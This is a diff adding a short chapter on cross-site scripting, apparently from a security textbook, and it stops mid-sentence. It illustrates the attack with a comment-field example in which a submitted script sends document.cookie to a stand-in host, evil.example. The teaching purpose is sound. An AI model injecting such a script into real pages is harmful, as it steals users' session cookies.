@@ -1,0 +1,27 @@
+---
+number: "22"
+title: "Cross-site scripting"
+part: "V"
+partTitle: "The browser is a boundary too"
+---
+<Figure>
+
+The attacker's script executes with your origin's privileges, in your victim's
+browser, as your victim.
+
+</Figure>
+
+The mechanism is section 3's again, with the browser as the parser:
+
+```html
+<!-- a comment field, rendered into the page -->
+<div class="comment">Nice article!</div>
+
+<!-- what somebody submitted instead -->
+<div class="comment"><script>
+  fetch('https://evil.example/?c=' + document.cookie)
+</script></div>
+```
+
+Because it is served from <Peach>your</Peach> domain, that script inherits everything your
+origin has:
